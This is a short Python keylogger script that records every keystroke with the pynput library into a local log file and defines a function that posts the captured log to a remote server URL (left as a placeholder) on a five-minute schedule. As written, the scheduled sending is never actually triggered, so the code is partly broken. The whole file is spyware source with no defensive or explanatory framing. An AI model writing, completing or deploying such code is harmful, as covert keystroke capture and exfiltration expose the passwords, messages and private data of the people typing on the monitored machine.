from pynput.keyboard import Listener
import schedule

import requests

LOG_FILE = 'keyboard_logs.txt'
SERVER_URL = '...'


def on_press(key):
    try:
        with open(LOG_FILE, 'a') as file:
            file.write(f'{key.char}')

    except Exception as error:
        with open(LOG_FILE, 'a') as file:
            file.write(f' {key} \n')

def send_logs():
    try:
        with open(LOG_FILE, 'r') as file:
            data = file.read()
        
        if data.strip(): 
            requests.post(SERVER_URL, data={'logs': data})
                
    except Exception as e:
        ...

schedule.every(5).minutes.do(send_logs)

with Listener(on_press=on_press) as listener:
    listener.join()    

